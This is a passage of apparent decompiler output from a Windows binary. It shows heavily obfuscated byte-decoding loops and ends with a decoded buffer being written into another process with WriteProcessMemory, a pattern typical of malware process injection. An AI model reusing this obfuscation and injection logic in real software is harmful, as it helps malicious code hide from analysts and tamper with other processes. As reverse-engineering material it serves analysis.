        goto LAB_14001d6fc;
      }
      bVar21 = bVar7 + (cVar6 - 0xbU) + (cVar6 - 0xbU & bVar7) * -2 + 0x4d;
      uVar16 = uVar16 + abStack_509[uVar16 + 0x21] + uVar23 + 1;
      goto LAB_14001cea2;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 + 0xa7U) * -2 + 'o' + cVar6 + 0xa7U;
LAB_14001cf30:
    if (uVar16 < uVar23) {
      puVar14 = (undefined4 *)(auStackY_5f8 + 0x164ed44);
      goto LAB_14001d860;
    }
    if (uVar23 + 0x10 <= uVar20) {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 == uVar23 + 3) {
          bVar21 = cVar6 - 0x15;
          cVar22 = '?';
          goto LAB_14001d692;
        }
        if (uVar20 != uVar23 + 5) {
          if (uVar20 != uVar23 + 4) goto LAB_14001cf90;
          bVar21 = ('-' - (cVar6 + 0x71U & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar16 = uVar16 + abStack_509[uVar16 + 0x21] + uVar23 + 1;
          goto LAB_14001cea2;
        }
        bVar21 = cVar6 + bVar7 + (cVar6 + 0x39U & bVar7) * -2 + 0xaa;
        uVar20 = uVar20 + uVar23;
        goto LAB_14001d755;
      }
      bVar21 = bVar7 + (cVar6 + 1U & bVar7) * -2 + -6 + cVar6;
      goto LAB_14001d6fc;
    }
    bVar21 = cVar6 + (cVar6 + 0xb3U & bVar7) * -2 + -0x32 + bVar7;
LAB_14001cf90:
    while (uVar17 = uVar23, uVar16 < uVar23 + uVar20) {
      while( true ) {
        do {
          uVar23 = uVar17;
          if (uVar20 == uVar23 + 0x80) {
            bVar21 = (':' - (cVar6 - 0x3eU & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001d6fc;
          }
          if (uVar20 == uVar23 + 0x61) {
            bVar21 = cVar6 + bVar7 + (cVar6 + 0x10U & bVar7) * -2 + 0xa0;
            uVar23 = uVar23 + 1;
            goto LAB_14001cea2;
          }
          if (uVar20 == uVar23 + 1) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x5eU & bVar7) * -2) - 0x34;
            goto LAB_14001cea2;
          }
          if (uVar20 == uVar23 + 100) {
            cVar22 = bVar7 + (cVar6 + 0xacU & bVar7) * -2 + -8;
            goto LAB_14001d6a1;
          }
          if (uVar20 == uVar23 + 0x1000) {
            bVar21 = ('\x12' - (cVar6 - 6U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar20 = uVar20 + uVar23;
            goto LAB_14001d755;
          }
          if (uVar20 == uVar23 + 0x2a) {
            bVar21 = ('(' - (cVar6 + 0x48U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001d755;
          }
          if (uVar20 == uVar23 + 5) {
            bVar21 = ('>' - (cVar6 + 0x96U & bVar7)) * '\x02' + bVar7 + cVar6;
            goto LAB_14001d783;
          }
          if (uVar20 == uVar23 + 0x10) {
            bVar21 = bVar7 + (cVar6 - 0x1cU & bVar7) * -2 + -0x58 + cVar6;
            goto LAB_14001d7ab;
          }
          uVar17 = uVar23;
        } while (uVar20 == uVar23 + 4);
        uVar20 = uVar23 + 2;
        uVar17 = uVar23 + 0xc;
        if (uVar20 < uVar23 + 0x14) {
          bVar21 = ('!' - (cVar6 + 0x75U & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001ce90;
        }
        if (uVar20 < uVar23 + 0x34) {
          bVar21 = ('7' - (cVar6 - 0x3dU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_14001cea0;
        }
        if (uVar20 < uVar23 + 0xd) {
          bVar21 = cVar6 + (cVar6 + 0x11U & bVar7) * -2 + -0x66 + bVar7;
          uVar23 = uVar17;
          goto LAB_14001cec0;
        }
        if (uVar20 < uVar23 + 0x12) {
          bVar21 = cVar6 + (cVar6 + 0x5fU & bVar7) * -2 + -0x3a + bVar7;
          uVar23 = uVar17;
          goto LAB_14001cf30;
        }
        if (uVar20 < uVar23 + 0x2c) break;
        if (uVar20 < uVar23 + 0x8c) {
          bVar21 = cVar6 - 5;
          cVar22 = '\x0f';
          uVar23 = uVar17;
          goto LAB_14001d2e0;
        }
        if (uVar20 < uVar23 + 0x6d) {
          bVar21 = cVar6 + 0x49;
          cVar22 = '%';
          uVar23 = uVar17;
          goto LAB_14001d270;
        }
        if (uVar23 + 0x100c <= uVar20) {
          uVar20 = uVar23 + 0x3f4;
          uVar17 = uVar23 + 0x41e;
          if (uVar23 + 0x45f < uVar20) {
            bVar21 = ('\b' - (cVar6 + 0x28U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar16 = uVar16 + abStack_509[uVar16 + 0x21] + uVar17 + 1;
            uVar23 = uVar17;
            goto LAB_14001cea2;
          }
          if (uVar23 + 0x421 < uVar20) {
            bVar21 = ('\x1e' - (cVar6 + 0x76U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_14001d7ab;
          }
          if (uVar23 + 0x61e < uVar20) {
            bVar21 = ('4' - (cVar6 - 0x3cU & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_14001d783;
          }
          if (uVar23 + 0x498 < uVar20) {
            bVar21 = cVar6 + bVar7 + (cVar6 + 0x12U & bVar7) * -2 + 0x94;
            uVar23 = uVar17;
            goto LAB_14001d755;
          }
          if (uVar23 + 0x420 < uVar20) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x60U & bVar7) * -2) - 0x40;
            uVar20 = uVar20 + uVar17;
            uVar23 = uVar17;
            goto LAB_14001d755;
          }
          if (uVar23 + 0x426 < uVar20) {
            cVar22 = bVar7 + (cVar6 + 0xaeU & bVar7) * -2 + -0x14;
            uVar23 = uVar17;
            goto LAB_14001d6a1;
          }
          if (uVar23 + 0x446 < uVar20) {
            bVar21 = ('\f' - (cVar6 - 4U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_14001cea2;
          }
          if (uVar23 + 0x424 < uVar20) {
            bVar21 = ('8' - (cVar6 + 0x98U & bVar7)) * '\x02' + bVar7 + cVar6;
            uVar23 = uVar17;
            goto LAB_14001d6fc;
          }
          if (uVar20 <= uVar23 + 0x43e) {
            uVar20 = uVar23 + 0x428;
            uVar17 = uVar23 + 0x4a8;
          }
        }
      }
      bVar21 = cVar6 + (cVar6 + 0xadU & bVar7) * -2 + -0xe + bVar7;
      uVar23 = uVar17;
    }
    if (uVar23 + 0x400 <= uVar20) {
      if (uVar20 == uVar23 + 1) {
        bVar21 = cVar6 + bVar7 + (cVar6 + 0x66U & bVar7) * -2 + 0x9c;
        uVar16 = uVar16 + abStack_509[uVar16 + 0x21] + uVar23 + 1;
      }
      else {
        if (uVar20 == uVar23 + 3) {
          bVar21 = bVar7 + (cVar6 + 2U & bVar7) * -2 + -0xc + cVar6;
          goto LAB_14001d783;
        }
        if (uVar20 != uVar23 + 5) {
          if (uVar20 != uVar23 + 7) goto LAB_14001d2ec;
          bVar21 = bVar7 + (cVar6 - 0x2aU & bVar7) * -2 + -4 + cVar6;
          goto LAB_14001d6fc;
        }
        bVar21 = cVar6 - 0x14;
        cVar22 = '<';
LAB_14001d692:
        cVar22 = (cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7;
LAB_14001d6a1:
        bVar21 = cVar22 + cVar6;
        abStack_509[uVar16 + 0x21] =
             cVar6 + 0x7fU + (cVar6 + 0x7fU & bVar7) * -2 + -0x79 + bVar21 + bVar7;
        uVar20 = uVar20 + uVar23;
LAB_14001d755:
        uVar16 = uVar16 - bVar21;
      }
      goto LAB_14001cea2;
    }
    bVar21 = cVar6 + 0xa7;
    cVar22 = '\v';
LAB_14001d2e0:
    bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7 + cVar6;
LAB_14001d2ec:
    if (uVar23 + uVar20 == 5) {
      bVar21 = ('\x0e' - (cVar6 + 0x26U & bVar7)) * '\x02' + cVar6;
LAB_14001d783:
      bVar11 = (cVar6 - 0x33U) + (cVar6 - 0x33U & bVar7) * -2 + 'e' + bVar7;
      abStack_509[uVar16 + 0x21] = bVar11;
      uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
      uVar23 = uVar23 + 1;
LAB_14001d7ab:
      bVar11 = (char)uVar16 + 0x74;
      abStack_509[uVar16 + 0x21] = bVar11 + (bVar11 & bVar7) * -2 + -0x2c + bVar7;
      uVar20 = uVar20 + 1;
      lVar24 = uVar16 + (-1 - uVar20);
      uVar16 = lVar24 + abStack_509[lVar24 + 0x21] + uVar23 + 1;
      goto LAB_14001cea2;
    }
    if (uVar23 + 0x28 < uVar20) {
      bVar21 = cVar6 - 0x35;
      cVar22 = '\x1f';
LAB_14001d270:
      bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7 + cVar6;
LAB_14001d27c:
      if (0x60 < uVar20) {
        cVar22 = bVar7 * '\x02' + (cVar6 - 0x28U & bVar7) * -2 + -0x10;
        goto LAB_14001d6a1;
      }
      if (uVar23 + 3 < uVar20) {
        bVar21 = ('\x06' - (cVar6 + 0x7eU & bVar7)) * '\x02' + bVar7 + cVar6;
      }
      else {
        if (uVar20 == uVar23 + 1) {
          bVar21 = ('\x1c' - (cVar6 - 0x34U & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar16 = uVar16 + abStack_509[uVar16 + 0x21] + uVar23 + 1;
          goto LAB_14001cea2;
        }
        if (uVar20 == uVar23 + 3) {
          bVar21 = bVar7 + (cVar6 + 0x68U & bVar7) * -2 + -0x70 + cVar6;
          goto LAB_14001d783;
        }
        if (uVar20 == uVar23 + 4) {
          bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001cea2;
        }
        if (uVar20 == uVar23 + 9) {
          bVar21 = bVar7 + (cVar6 + 0x3cU & bVar7) * -2 + -0x68 + cVar6;
          goto LAB_14001d6fc;
        }
      }
      if (uVar23 < 0x61) {
        abStack_509[uVar16 + 0x21] = bVar21;
        uVar16 = uVar16 + 1;
        goto LAB_14001cea2;
      }
      bVar21 = (bVar7 + (cVar6 + 0x8aU & bVar7) * -2 + cVar6) * '\x02' + 0x88;
    }
    else {
      if (uVar20 != uVar23 + 1) {
        if (uVar20 != uVar23 + 3) {
          if (uVar20 != uVar23 + 2) {
            if (uVar20 == uVar23 + 7) {
              bVar21 = ('9' - (cVar6 - 0x13U & bVar7)) * '\x02' + bVar7 + cVar6;
              goto LAB_14001d783;
            }
            goto LAB_14001d27c;
          }
          bVar21 = ('#' - (cVar6 + 0x9fU & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001d755;
        }
        bVar21 = (cVar6 + bVar7 + (cVar6 + 0xb5U & bVar7) * -2) - 0x3e;
        goto LAB_14001cea2;
      }
      bVar21 = ('5' - (cVar6 + 0x19U & bVar7)) * '\x02' + bVar7 + cVar6;
    }
LAB_14001d6fc:
    abStack_509[uVar16 + 0x21] = cVar6 + 0x31U + (cVar6 + 0x31U & bVar7) * -2 + -0x57 + bVar7;
    uVar23 = uVar23 + 1;
    goto LAB_14001cea2;
  }
  puVar14 = &local_4e8;
LAB_14001d860:
  FUN_140023550(local_4c8,puVar14);
  local_88 = FUN_1400386d0(&local_78,pHVar8,local_4c8);
  FUN_140025000(local_4c8);
  uVar9 = FUN_140024ff0(local_50);
  local_4a8 = 0xf84d;
  local_4a6 = 100;
  local_4a5 = 0;
  uStack_49d = 0;
  local_495 = 0;
  bVar21 = local_5c8;
LAB_14001d8d0:
  uVar17 = DAT_140a618c8;
  uVar20 = DAT_140a618d0;
LAB_14001d8e0:
  uVar16 = 0;
  uVar23 = uVar20;
LAB_14001d8e2:
  if (uVar16 < 0x15) {
    bVar7 = local_4c8[uVar16 + 0x20];
LAB_14001d8f2:
    if (uVar16 < uVar17) {
      puVar18 = (undefined2 *)(auStackY_5f8 + 0x14a6eed);
      goto LAB_14001e30f;
    }
    cVar6 = (char)uVar16;
    if (uVar23 + 1 <= uVar17) {
      if (uVar17 == uVar23 + 1) {
        bVar21 = cVar6 + 0x13U + bVar7 + (bVar7 & cVar6 + 0x13U) * -2 + 0x7b;
        uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar23 + 1;
      }
      else {
        if (uVar17 == uVar23 + 3) {
          bVar21 = bVar7 + (bVar7 & cVar6 - 0x29U) * -2 + '\x1f' + (cVar6 - 0x29U);
          goto LAB_14001e238;
        }
        if (uVar17 == uVar23 + 5) {
          bVar21 = (cVar6 + 0x9bU + bVar7 + (bVar7 & cVar6 + 0x9bU) * -2) - 0x3d;
          goto LAB_14001e203;
        }
        if (uVar17 == uVar23 + 2) {
          bVar21 = (cVar6 + bVar7 + (cVar6 + 0x5fU & bVar7) * -2) - 0x3a;
        }
        else {
          if (uVar17 != uVar23 + 4) goto LAB_14001d960;
          bVar21 = cVar6 - 0x3f;
          cVar22 = '=';
LAB_14001e1b2:
          bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar23 = uVar23 + 1;
        }
      }
      goto LAB_14001d8e2;
    }
    bVar21 = bVar7 + (bVar7 & cVar6 + 0xb1U) * -2 + ')' + cVar6 + 0xb1U;
LAB_14001d960:
    if (uVar16 < uVar23) {
      puVar18 = (undefined2 *)(auStackY_5f8 + 0x177e03c);
      goto LAB_14001e30f;
    }
    if (uVar23 + 0x80 <= uVar17) {
      if (uVar17 == uVar23 + 1) {
        cVar22 = bVar7 + (cVar6 - 0x19U & bVar7) * -2 + -0x6a;
        goto LAB_14001e17f;
      }
      if (uVar17 != uVar23 + 2) {
        if (uVar17 != uVar23 + 4) {
          if (uVar17 != uVar23 + 3) goto LAB_14001d9c0;
          bVar21 = bVar7 + (cVar6 + 0x95U & bVar7) * -2 + -0x7e + cVar6;
          goto LAB_14001e25e;
        }
        bVar21 = ('3' - (cVar6 + 0x6fU & bVar7)) * '\x02' + bVar7 + cVar6;
        goto LAB_14001e203;
      }
      bVar21 = (cVar6 + bVar7 + (cVar6 + 0xabU & bVar7) * -2) - 2;
      goto LAB_14001d8e2;
    }
    bVar21 = bVar7 + (cVar6 + 0x85U & bVar7) * -2 + -0x1e + cVar6;
LAB_14001d9c0:
    while( true ) {
      uVar20 = uVar23;
      if (uVar23 + uVar17 <= uVar16) break;
      while( true ) {
        uVar23 = uVar20;
        if (uVar17 == uVar23 + 0x41) {
          cVar22 = bVar7 + (cVar6 + 0xeU & bVar7) * -2 + -0x54;
          goto LAB_14001e17f;
        }
        if (uVar17 == uVar23 + 0x2a) {
          bVar21 = cVar6 + 0x70;
          cVar22 = '0';
          goto LAB_14001e1b2;
        }
        if (uVar17 == uVar23 + 0x20) {
          bVar21 = ('\n' - (cVar6 - 0x2eU & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001d8e2;
        }
        if (uVar17 == uVar23 + 0x7a) {
          cVar22 = bVar7 + (cVar6 + 0x34U & bVar7) * -2 + -0x38;
          goto LAB_14001e0d9;
        }
        if (uVar17 == uVar23 + 0x5a) {
          bVar21 = ('>' - (cVar6 + 0x96U & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001e203;
        }
        if (uVar17 == uVar23 + 0x10) {
          bVar21 = ('\x18' - (cVar6 - 8U & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001e206;
        }
        uVar25 = uVar23 + 0x28;
        if (uVar17 == uVar25) {
          bVar21 = bVar7 + (cVar6 + 0x5aU & bVar7) * -2 + -0x1c + cVar6;
          goto LAB_14001e238;
        }
        if (uVar17 == uVar23 + 10) {
          bVar21 = ('&' - (cVar6 + 0x1eU & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar23 + 1;
          goto LAB_14001d8e2;
        }
        uVar20 = uVar23 + 0xa2;
        if (uVar25 < uVar23 + 0xe3) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0x93U & bVar7) * -2 + 0x8e;
          goto LAB_14001d8d0;
        }
        uVar17 = uVar25;
        if (uVar25 < uVar23 + 0xac) {
          bVar21 = ('!' - (cVar6 - 0xbU & bVar7)) * '\x02' + bVar7 + cVar6;
          goto LAB_14001d8e0;
        }
        if (uVar25 < uVar23 + 0xc2) {
          bVar21 = bVar7 + (cVar6 + 0x57U & bVar7) * -2 + -10 + cVar6;
          uVar23 = uVar20;
          goto LAB_14001d8f2;
        }
        if (uVar25 < uVar23 + 0x11c) {
          bVar21 = bVar7 + (cVar6 + 0xb9U & bVar7) * -2 + -0x56 + cVar6;
          uVar23 = uVar20;
          goto LAB_14001d960;
        }
        if (uVar25 < uVar23 + 0xfc) break;
        if (uVar25 < uVar23 + 0xb2) {
          cVar22 = ('\t' - (cVar6 + 0x7dU & bVar7)) * '\x02' + bVar7;
          uVar23 = uVar20;
          goto LAB_14001dcb0;
        }
        uVar17 = uVar23 + 0x103;
        if (uVar25 < uVar17) {
          cVar22 = bVar7 + (cVar6 - 0x21U & bVar7) * -2 + -0x3a;
          uVar17 = uVar25;
          uVar23 = uVar20;
          goto LAB_14001dc45;
        }
        uVar20 = uVar23 + 0x17d;
        if (uVar23 + 0x1be < uVar17) {
          bVar21 = ('8' - (cVar6 + 0x18U & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar20 + 1;
          uVar23 = uVar20;
          goto LAB_14001d8e2;
        }
        if (uVar23 + 0x187 < uVar17) {
          bVar21 = ('\x12' - (cVar6 + 0x7aU & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar23 = uVar20;
          goto LAB_14001e25e;
        }
        if (uVar23 + 0x19d < uVar17) {
          bVar21 = bVar7 + (cVar6 - 0x24U & bVar7) * -2 + -0x28 + cVar6;
          uVar23 = uVar20;
          goto LAB_14001e238;
        }
        if (uVar23 + 0x1f7 < uVar17) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0x3eU & bVar7) * -2 + 0x8c;
          uVar23 = uVar20;
          goto LAB_14001e206;
        }
        if (uVar23 + 0x186 < uVar17) {
          bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar23 = uVar20;
          goto LAB_14001e203;
        }
        if (uVar23 + 0x18d < uVar17) {
          cVar22 = bVar7 + (cVar6 + 2U & bVar7) * -2 + -0xc;
          uVar23 = uVar20;
          goto LAB_14001e0d9;
        }
        if (uVar23 + 0x1de < uVar17) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 100U & bVar7) * -2 + 0xa8;
          uVar23 = uVar20;
          goto LAB_14001d8e2;
        }
        if (uVar17 <= uVar23 + 0x117d) {
          uVar17 = uVar23 + 0x1de;
          uVar20 = uVar23 + 600;
        }
      }
      bVar21 = ('/' - (cVar6 + 0x1bU & bVar7)) * '\x02' + bVar7 + cVar6;
      uVar23 = uVar20;
    }
    if (uVar17 < uVar23 + 100) {
      cVar22 = bVar7 + (cVar6 + 0xb1U & bVar7) * -2 + -0x26;
LAB_14001dcb0:
      bVar21 = cVar22 + cVar6;
LAB_14001dcb3:
      if (uVar23 + uVar17 != 0x40) {
        if (uVar23 + 0x42 < uVar17) {
          cVar22 = bVar7 + (cVar6 + 0x2dU & bVar7) * -2 + -0xe;
LAB_14001dc45:
          bVar21 = cVar22 + cVar6;
LAB_14001dc48:
          if (0x3f < uVar17) {
            cVar22 = bVar7 + (cVar6 - 0x18U & bVar7) * -2 + -0x70;
LAB_14001e0d6:
            cVar22 = cVar22 + bVar7;
LAB_14001e0d9:
            bVar21 = cVar22 + cVar6;
            local_4c8[uVar16 + 0x20] =
                 bVar7 + (bVar7 & cVar6 + 0x99U) * -2 + -0x2f + bVar21 + cVar6 + 0x99U;
            goto LAB_14001e203;
          }
          if (uVar23 + 0x41 < uVar17) {
            bVar21 = bVar7 + (cVar6 + 0xb2U & bVar7) * -2 + -0x2c + cVar6;
          }
          else {
            if (uVar17 == uVar23 + 1) {
              bVar21 = cVar6 + bVar7 + (cVar6 + 0x14U & bVar7) * -2 + 0x88;
              uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar23 + 1;
              goto LAB_14001d8e2;
            }
            if (uVar17 == uVar23 + 2) {
              bVar21 = bVar7 + (cVar6 - 0x28U & bVar7) * -2 + -0x10 + cVar6;
              goto LAB_14001e238;
            }
            if (uVar17 == uVar23 + 3) {
              bVar21 = cVar6 + bVar7 + (cVar6 + 0x3aU & bVar7) * -2 + 0xa4;
              goto LAB_14001e206;
            }
            if (uVar17 == uVar23 + 2) {
              bVar21 = (',' - (cVar6 + 0x9cU & bVar7)) * '\x02' + bVar7 + cVar6;
              goto LAB_14001e203;
            }
            if (uVar17 == uVar23 + 5) {
              cVar22 = ('\x06' - (cVar6 - 2U & bVar7)) * '\x02';
              goto LAB_14001e0d6;
            }
            if (uVar17 == uVar23 + 6) {
              cVar22 = ('\x14' - (cVar6 + 0x24U & bVar7)) * '\x02' + bVar7;
              goto LAB_14001e17f;
            }
          }
          if (uVar23 < 0x40) {
            local_4c8[uVar16 + 0x20] = bVar21;
            uVar16 = uVar16 + 1;
            goto LAB_14001d8e2;
          }
          bVar21 = (bVar7 + (cVar6 + 0x86U & bVar7) * -2 + cVar6) * '\x02' + 0xb8;
        }
        else {
          if (uVar17 != uVar23 + 1) {
            if (uVar17 == uVar23 + 2) {
              bVar21 = ('\a' - (cVar6 + 0x53U & bVar7)) * '\x02' + bVar7 + cVar6;
            }
            else {
              if (uVar17 == uVar23 + 3) {
                cVar22 = bVar7 + (cVar6 + 0xb5U & bVar7) * -2 + -0x3e;
                goto LAB_14001e0d9;
              }
              if (uVar17 == uVar23 + 2) {
                bVar21 = (';' - (cVar6 + 0x17U & bVar7)) * '\x02' + bVar7 + cVar6;
                goto LAB_14001e203;
              }
              if (uVar17 == uVar23 + 5) {
                bVar21 = ('\x15' - (cVar6 + 0x79U & bVar7)) * '\x02' + bVar7 + cVar6;
                goto LAB_14001e206;
              }
              if (uVar17 == uVar23 + 4) {
                bVar21 = bVar7 + (cVar6 - 0x25U & bVar7) * -2 + -0x22 + cVar6;
                goto LAB_14001e238;
              }
              if (uVar17 != uVar23 + 6) goto LAB_14001dc48;
              bVar21 = ('#' - (cVar6 + 0x9fU & bVar7)) * '\x02' + bVar7 + cVar6;
              uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar23 + 1;
            }
            goto LAB_14001d8e2;
          }
          cVar22 = bVar7 + (cVar6 + 0x8fU & bVar7) * -2 + -0x5a;
LAB_14001e17f:
          bVar21 = cVar22 + cVar6;
        }
        local_4c8[uVar16 + 0x20] = bVar7 + (bVar7 & cVar6 + 0x37U) * -2 + '\x7f' + cVar6 + 0x37U;
        uVar23 = uVar23 + 1;
        goto LAB_14001d8e2;
      }
      bVar21 = ('\"' - (cVar6 + 0x4aU & bVar7)) * '\x02' + cVar6;
    }
    else {
      if (uVar17 == uVar23 + 1) {
        bVar21 = (cVar6 + bVar7 + (cVar6 + 10U & bVar7) * -2) - 0x3c;
        uVar16 = uVar16 + (byte)local_4c8[uVar16 + 0x20] + uVar23 + 1;
        goto LAB_14001d8e2;
      }
      if (uVar17 != uVar23 + 2) {
        if (uVar17 == uVar23 + 2) {
          bVar21 = cVar6 + bVar7 + (cVar6 + 0x92U & bVar7) * -2 + 0x94;
LAB_14001e203:
          uVar17 = uVar17 + uVar23;
LAB_14001e206:
          uVar16 = uVar16 - bVar21;
        }
        else {
          if (uVar17 == uVar23 + 5) {
            cVar22 = ('$' - (cVar6 - 0xcU & bVar7)) * '\x02';
            goto LAB_14001e0d6;
          }
          if (uVar17 == uVar23 + 4) {
            bVar21 = (cVar6 + bVar7 + (cVar6 + 0x56U & bVar7) * -2) - 4;
          }
          else {
            if (uVar17 != uVar23 + 3) goto LAB_14001dcb3;
            bVar21 = cVar6 + bVar7 + (cVar6 + 0xb8U & bVar7) * -2 + 0xb0;
            uVar23 = uVar23 + 1;
          }
        }
        goto LAB_14001d8e2;
      }
      bVar21 = ('\x16' - (cVar6 - 0x32U & bVar7)) * '\x02' + bVar7 + cVar6;
    }
LAB_14001e238:
    bVar11 = bVar7 + (bVar7 & cVar6 - 5U) * -2 + '#' + (cVar6 - 5U);
    local_4c8[uVar16 + 0x20] = bVar11;
    uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
    uVar23 = uVar23 + 1;
LAB_14001e25e:
    bVar11 = (char)uVar16 + 0xac;
    local_4c8[uVar16 + 0x20] = ('&' - (bVar7 & bVar11)) * '\x02' + bVar7 + bVar11;
    uVar17 = uVar17 + 1;
    lVar24 = uVar16 + (-1 - uVar17);
    uVar16 = lVar24 + (byte)local_4c8[lVar24 + 0x20] + uVar23 + 1;
    goto LAB_14001d8e2;
  }
  puVar18 = &local_4a8;
LAB_14001e30f:
  FUN_14000eaa0(local_188,0x100,puVar18,uVar9);
  lVar24 = 2;
  puVar4 = local_2c8;
  puVar5 = local_188;
  do {
    puVar13 = puVar5;
    puVar10 = puVar4;
    uVar9 = puVar13[1];
    *puVar10 = *puVar13;
    puVar10[1] = uVar9;
    uVar9 = puVar13[3];
    puVar10[2] = puVar13[2];
    puVar10[3] = uVar9;
    uVar9 = puVar13[5];
    puVar10[4] = puVar13[4];
    puVar10[5] = uVar9;
    uVar9 = puVar13[7];
    puVar10[6] = puVar13[6];
    puVar10[7] = uVar9;
    uVar9 = puVar13[9];
    puVar10[8] = puVar13[8];
    puVar10[9] = uVar9;
    uVar9 = puVar13[0xb];
    puVar10[10] = puVar13[10];
    puVar10[0xb] = uVar9;
    uVar9 = puVar13[0xd];
    puVar10[0xc] = puVar13[0xc];
    puVar10[0xd] = uVar9;
    uVar1 = *(undefined4 *)((longlong)puVar13 + 0x74);
    uVar2 = *(undefined4 *)(puVar13 + 0xf);
    uVar3 = *(undefined4 *)((longlong)puVar13 + 0x7c);
    *(undefined4 *)(puVar10 + 0xe) = *(undefined4 *)(puVar13 + 0xe);
    *(undefined4 *)((longlong)puVar10 + 0x74) = uVar1;
    *(undefined4 *)(puVar10 + 0xf) = uVar2;
    *(undefined4 *)((longlong)puVar10 + 0x7c) = uVar3;
    lVar24 = lVar24 + -1;
    puVar4 = puVar10 + 0x10;
    puVar5 = puVar13 + 0x10;
  } while (lVar24 != 0);
  uVar1 = *(undefined4 *)((longlong)puVar13 + 0x84);
  uVar2 = *(undefined4 *)(puVar13 + 0x11);
  uVar3 = *(undefined4 *)((longlong)puVar13 + 0x8c);
  *(undefined4 *)(puVar10 + 0x10) = *(undefined4 *)(puVar13 + 0x10);
  *(undefined4 *)((longlong)puVar10 + 0x84) = uVar1;
  *(undefined4 *)(puVar10 + 0x11) = uVar2;
  *(undefined4 *)((longlong)puVar10 + 0x8c) = uVar3;
  WriteProcessMemory(local_78,lpBaseAddress,local_2c8,0x110,(SIZE_T *)0x0);
  local_68 = (LPCVOID)0x0;
  lStack_60 = 0;
  local_58 = 0;
  FUN_1400392c0(&local_68,FUN_14000fc00);
  local_488 = 0x3b383936;
  uStack_484 = 0x3f3c3e3a;
  local_480 = 0;
  local_478 = 0;
  local_474 = 0;
  bVar21 = local_5c8;
LAB_14001e407:
  uVar23 = 0;
  uVar20 = DAT_140a618c8;
  uVar17 = DAT_140a618d0;
LAB_14001e423:
  if (uVar23 < 0x15) {
    bVar7 = local_448[uVar23 - 0x40];
    cVar6 = (char)uVar23;
    while (uVar20 <= uVar23) {
      if (uVar17 + 1 <= uVar20) {
        if (uVar20 == uVar17 + 1) {
          bVar21 = (bVar7 + cVar6 + 5U + (cVar6 + 5U & bVar7) * -2) - 0x23;
          uVar23 = uVar23 + (byte)local_448[uVar23 - 0x40] + uVar17 + 1;
        }
        else {
          if (uVar20 != uVar17 + 2) {
            if (uVar20 != uVar17 + 2) goto LAB_14001e48f;
            bVar21 = bVar7 + cVar6 + 0x61U + (cVar6 + 0x61U & bVar7) * -2 + 0x59;
            goto LAB_14001e9da;
          }
          bVar21 = bVar7 + cVar6 + 0xb3U + (cVar6 + 0xb3U & bVar7) * -2 + 0x1b;
LAB_14001ea1b:
          bVar11 = (char)uVar23 + 0xb4;
          local_448[uVar23 - 0x40] = ('\n' - (bVar7 & bVar11)) * '\x02' + bVar7 + bVar11;
          uVar20 = uVar20 + 1;
          lVar24 = uVar23 + (-1 - uVar20);
          uVar23 = lVar24 + (byte)local_448[lVar24 + -0x40] + uVar17 + 1;
        }
        goto LAB_14001e423;
      }
      bVar21 = bVar7 + (bVar7 & cVar6 + 0x57U) * -2 + -0x61 + cVar6 + 0x57U;
LAB_14001e48f:
      if (uVar23 < uVar17) {
        in_stack_0105b243 = in_stack_0146c5ec;
        break;
      }
      uVar16 = uVar17 + 1;
      if (uVar16 <= uVar20) {
        if (uVar20 == uVar16) {
          bVar21 = cVar6 - 0x2f;
          cVar22 = '\r';
LAB_14001e98b:
          cVar22 = (cVar22 - (bVar21 & bVar7)) * '\x02' + bVar7;
LAB_14001e996:
          bVar21 = cVar22 + cVar6;
LAB_14001e999:
          local_448[uVar23 - 0x40] = cVar6 + 1U + (cVar6 + 1U & bVar7) * -2 + -7 + bVar7;
          uVar17 = uVar17 + 1;
        }
        else if (uVar20 == uVar17 + 2) {
          bVar21 = ('\x03' - (cVar6 + 0x7fU & bVar7)) * '\x02' + bVar7 + cVar6;
          uVar17 = uVar17 + 1;
        }
        else {
          if (uVar20 != uVar17 + 2) goto LAB_14001e4f0;
          bVar21 = (cVar6 + bVar7 + (cVar6 + 0x89U & bVar7) * -2) - 0x36;
          uVar20 = uVar20 + uVar17;
LAB_14001e944:
          uVar23 = uVar23 - bVar21;
        }
        goto LAB_14001e423;
      }
